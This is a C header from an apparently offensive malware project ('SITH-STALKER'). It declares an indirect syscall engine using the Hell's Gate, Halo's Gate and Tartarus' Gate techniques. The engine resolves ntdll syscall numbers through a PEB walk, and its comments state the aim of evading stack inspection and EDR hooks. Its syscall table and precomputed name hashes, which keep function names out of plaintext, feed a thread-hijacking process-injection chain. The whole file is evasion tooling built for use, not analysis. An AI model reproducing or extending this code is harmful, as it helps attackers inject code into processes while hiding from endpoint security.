/*
 * gate.h — Indirect Syscall Engine (Hell's Gate + Halo's Gate)
 * ═══════════════════════════════════════════════════════════════════
 * SITH-STALKER — 22DIV / george wu
 *
 * Extracts System Service Numbers (SSNs) from ntdll.dll stubs at
 * runtime using PEB walk + PE export parsing. Invokes syscalls
 * indirectly through ntdll's own code space to evade stack inspection.
 *
 * NO GetModuleHandle. NO GetProcAddress. NO LoadLibrary.
 * Every resolution goes through the PEB and PE headers directly.
 *
 * Handles three scenarios:
 *   1. CLEAN stub  — SSN extracted directly (Hell's Gate)
 *   2. HOOKED stub — SSN recovered from neighbor stubs (Halo's Gate)
 *   3. DEEP HOOK   — Multiple neighbors checked (Tartarus' Gate)
 */

#ifndef GATE_H
#define GATE_H

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 * SYSCALL ENTRY — one per resolved Nt* function
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _SYSCALL_ENTRY {
    DWORD  ssn;              /* System Service Number (EAX value) */
    void  *syscall_addr;     /* Address of syscall;ret gadget in ntdll */
    BOOL   resolved;         /* TRUE if successfully extracted */
    BOOL   was_hooked;       /* TRUE if Halo's Gate recovery was needed */
} SYSCALL_ENTRY;

/* ═══════════════════════════════════════════════════════════════════
 * GATE TABLE — all resolved syscalls for VADER's injection chain
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _GATE_TABLE {
    SYSCALL_ENTRY NtOpenThread;
    SYSCALL_ENTRY NtSuspendThread;
    SYSCALL_ENTRY NtResumeThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtClose;
} GATE_TABLE;

/* ═══════════════════════════════════════════════════════════════════
 * PUBLIC API
 * ═══════════════════════════════════════════════════════════════════ */

/* Initialize gate table — walks PEB, parses ntdll exports, extracts SSNs.
 * Returns number of successfully resolved entries. */
int gate_init(GATE_TABLE *table);

/* Find ntdll base via PEB InMemoryOrderModuleList walk.
 * No API calls — pure memory reads. */
HMODULE gate_find_ntdll(void);

/* Resolve a single Nt* function's SSN and syscall gadget address.
 * Uses Hell's Gate (clean stub) with Halo's Gate fallback (hooked stub).
 * fn_hash: DJB2 hash of function name (avoids plaintext strings). */
BOOL gate_resolve(HMODULE ntdll, DWORD fn_hash, SYSCALL_ENTRY *entry);

/* Resolve by name (for debugging/testing — uses plaintext string).
 * Production code should use gate_resolve with hash. */
BOOL gate_resolve_by_name(HMODULE ntdll, const char *fn_name, SYSCALL_ENTRY *entry);

/* DJB2 hash of a string (compile-time or runtime). */
DWORD gate_hash(const char *str);

/* ═══════════════════════════════════════════════════════════════════
 * ASM STUBS (defined in gate_stub.asm, linked via ml64.exe)
 * ═══════════════════════════════════════════════════════════════════
 * SetSyscall: loads SSN into global, stores gadget address
 * IndirectSyscall: mov r10,rcx / mov eax,ssn / jmp [gadget]
 *
 * Usage pattern:
 *   SetSyscall(table.NtOpenThread.ssn, table.NtOpenThread.syscall_addr);
 *   status = IndirectSyscall(args...);
 * ═══════════════════════════════════════════════════════════════════ */

extern void SetSyscall(DWORD ssn, void *syscall_addr);

/* IndirectSyscall takes the SAME args as the Nt* function.
 * Declared as variadic — actual arg passing matches Nt* prototype.
 * Cast to the correct Nt* function pointer type before calling. */
extern NTSTATUS IndirectSyscall(void);

/* ═══════════════════════════════════════════════════════════════════
 * CONVENIENCE MACROS
 * ═══════════════════════════════════════════════════════════════════ */

/* Prepare + invoke in one line.
 * GATE_CALL(table.NtOpenThread, NtOpenThread_args...) */
#define GATE_CALL(entry, ...) \
    (SetSyscall((entry).ssn, (entry).syscall_addr), \
     ((NTSTATUS(*)(void))IndirectSyscall)(__VA_ARGS__))

/* Pre-computed DJB2 hashes for VADER's target functions.
 * Avoids storing plaintext "NtOpenThread" etc. in the binary. */
#define HASH_NtOpenThread           0xFB8A31D1
#define HASH_NtSuspendThread        0x50FEBD61
#define HASH_NtResumeThread         0x2C7B3D30
#define HASH_NtGetContextThread     0x9E0E1A44
#define HASH_NtSetContextThread     0x308BE0D0
#define HASH_NtAllocateVirtualMemory 0x6793C34C
#define HASH_NtWriteVirtualMemory   0x95F3A792
#define HASH_NtProtectVirtualMemory 0x082962C8
#define HASH_NtCreateThreadEx       0xCB0C2130
#define HASH_NtClose                0x8B8E133D

#endif /* GATE_H */
